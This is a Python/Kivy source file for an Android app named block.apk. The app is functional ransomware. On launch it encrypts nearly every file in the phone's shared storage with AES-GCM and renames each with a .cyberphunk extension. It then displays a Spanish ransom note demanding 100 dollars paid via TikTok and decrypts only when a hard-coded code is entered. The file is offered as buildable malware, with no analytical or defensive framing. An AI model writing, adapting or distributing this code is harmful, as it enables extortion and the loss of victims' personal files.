# main.py — block.apk (SECTOR 7G)
# Requiere: kivy, pycryptodome
# Compilar con buildozer en Termux/Linux/Colab

import os
import json
import base64
import threading
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.uix.textinput import TextInput
from kivy.clock import Clock
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Protocol.KDF import PBKDF2

CLAVE_RESCATE = "123"
CARPETA_OBJETIVO = "/storage/emulated/0/"
ARCHIVO_ESTADO = os.path.join(os.path.expanduser("~"), ".block_state.json")
EXTENSION = ".cyberphunk"
MENSAJE = "Haz sido encryptado\nPaga 100 dolares a Cyberphunk en tiktok"
SALT = b"SECTOR7G_BLOCK_2024"


def derivar_clave(p):
    return PBKDF2(p, SALT, dkLen=32, count=100_000)


def cifrar_archivo(ruta, clave):
    try:
        with open(ruta, "rb") as f:
            datos = f.read()
        if not datos:
            return False
        nonce = get_random_bytes(12)
        cipher = AES.new(clave, AES.MODE_GCM, nonce=nonce)
        ct, tag = cipher.encrypt_and_digest(datos)
        with open(ruta, "wb") as f:
            f.write(base64.b64encode(nonce + tag + ct))
        os.rename(ruta, ruta + EXTENSION)
        return True
    except Exception:
        return False


def descifrar_archivo(ruta, clave):
    try:
        with open(ruta, "rb") as f:
            payload = base64.b64decode(f.read())
        nonce, tag, ct = payload[:12], payload[12:28], payload[28:]
        cipher = AES.new(clave, AES.MODE_GCM, nonce=nonce)
        datos = cipher.decrypt_and_verify(ct, tag)
        original = ruta[:-len(EXTENSION)] if ruta.endswith(EXTENSION) else ruta
        with open(original, "wb") as f:
            f.write(datos)
        if ruta != original:
            os.remove(ruta)
        return True
    except Exception:
        return False


def listar_objetivos(base):
    excluir = (".cyberphunk", ".json", ".log", ".tmp")
    for raiz, _, archivos in os.walk(base):
        if "/Android/data" in raiz or "/Android/obb" in raiz:
            continue
        for a in archivos:
            if a.endswith(excluir):
                continue
            yield os.path.join(raiz, a)


def cargar_estado():
    if os.path.isfile(ARCHIVO_ESTADO):
        try:
            with open(ARCHIVO_ESTADO, "r") as f:
                return json.load(f)
        except Exception:
            pass
    return {"cifrados": [], "activo": False}


def guardar_estado(e):
    try:
        with open(ARCHIVO_ESTADO, "w") as f:
            json.dump(e, f)
    except Exception:
        pass


class BlockUI(BoxLayout):
    def __init__(self, **kw):
        super().__init__(orientation="vertical", padding=30, spacing=20, **kw)
        self.estado = cargar_estado()
        self.clave = derivar_clave(CLAVE_RESCATE)
        self.add_widget(Label(text="BLOCK.APK", font_size=36,
                              color=(1, 0, 0, 1), size_hint=(1, 0.15)))
        self.add_widget(Label(text=MENSAJE, font_size=22,
                              color=(1, 1, 1, 1), halign="center",
                              size_hint=(1, 0.35)))
        self.entrada = TextInput(hint_text="Codigo de rescate",
                                 multiline=False, font_size=20,
                                 size_hint=(1, 0.12))
        self.add_widget(self.entrada)
        self.add_widget(Button(text="DESCIFRAR", font_size=22,
                               background_color=(0, 0.6, 0, 1),
                               size_hint=(1, 0.15),
                               on_press=self.intentar_descifrar))
        self.estado_label = Label(text="", font_size=16, size_hint=(1, 0.1))
        self.add_widget(self.estado_label)
        Clock.schedule_once(lambda dt: self.iniciar_cifrado(), 1)

    def iniciar_cifrado(self):
        if self.estado.get("activo"):
            self.estado_label.text = f"Cifrados: {len(self.estado['cifrados'])}"
            return
        threading.Thread(target=self.cifrar_todo, daemon=True).start()

    def cifrar_todo(self):
        cifrados = []
        total = 0
        for ruta in listar_objetivos(CARPETA_OBJETIVO):
            if cifrar_archivo(ruta, self.clave):
                cifrados.append(ruta + EXTENSION)
                total += 1
                if total % 50 == 0:
                    Clock.schedule_once(lambda dt, t=total: setattr(
                        self.estado_label, "text", f"Cifrando... {t}"), 0)
        self.estado["cifrados"] = cifrados
        self.estado["activo"] = True
        guardar_estado(self.estado)
        Clock.schedule_once(lambda dt: setattr(
            self.estado_label, "text", f"{total} archivos cifrados"), 0)

    def intentar_descifrar(self, *_):
        if self.entrada.text.strip() != CLAVE_RESCATE:
            self.estado_label.text = "Codigo incorrecto. Paga a Cyberphunk."
            return
        self.estado_label.text = "Codigo correcto. Restaurando..."
        threading.Thread(target=self.descifrar_todo, daemon=True).start()

    def descifrar_todo(self):
        ok = 0
        for ruta in self.estado.get("cifrados", []):
            if descifrar_archivo(ruta, self.clave):
                ok += 1
        self.estado["cifrados"] = []
        self.estado["activo"] = False
        guardar_estado(self.estado)
        Clock.schedule_once(lambda dt: setattr(
            self.estado_label, "text", f"{ok} archivos restaurados"), 0)


class BlockApp(App):
    def build(self):
        return BlockUI()


if __name__ == "__main__":
    BlockApp().run()
